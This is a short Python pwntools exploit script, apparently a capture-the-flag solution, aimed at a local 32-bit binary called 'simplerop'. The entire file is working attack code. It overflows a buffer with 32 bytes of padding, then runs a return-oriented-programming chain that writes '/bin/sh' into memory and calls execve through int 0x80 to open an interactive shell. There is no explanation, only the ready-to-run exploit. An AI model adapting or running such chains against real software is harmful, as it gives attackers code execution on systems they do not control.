#!/usr/bin/env python
#-*- coding: utf-8 -*-
from pwn import *

context(arch = "i386", os = "linux", bits = 32)
p = process("simplerop")

p.recvline()
p.recv()

elf = ELF("simplerop")

buf = 0x080ea060  # .data data
buf = elf.bss()

pop_eax = 0x080bae06    # pop eax ; ret
pop_edx_ecx_ebx = 0x0806e850 # pop edx ; pop ecx ; pop ebx ; ret
pop_edx = 0x0806e82a    # pop edx ; ret
mov_edx_eax = 0x0807b301 # mov dword ptr [eax], edx ; ret
syscall = 0x080493e1    # int 0x80

padding = "A" * 32
rop_chain  = p32(pop_eax)
rop_chain += p32(buf)
rop_chain += p32(pop_edx)
rop_chain += "/bin"
rop_chain += p32(mov_edx_eax)
rop_chain += p32(pop_eax)
rop_chain += p32(buf+4)
rop_chain += p32(pop_edx)
rop_chain += "/sh\x00"
rop_chain += p32(mov_edx_eax)
rop_chain += p32(pop_edx_ecx_ebx)
rop_chain += p32(0)
rop_chain += p32(0)
rop_chain += p32(buf)
rop_chain += p32(pop_eax)
rop_chain += p32(0xb)
rop_chain += p32(syscall)

payload = padding + rop_chain

p.sendline(payload)

p.interactive()
p.close()
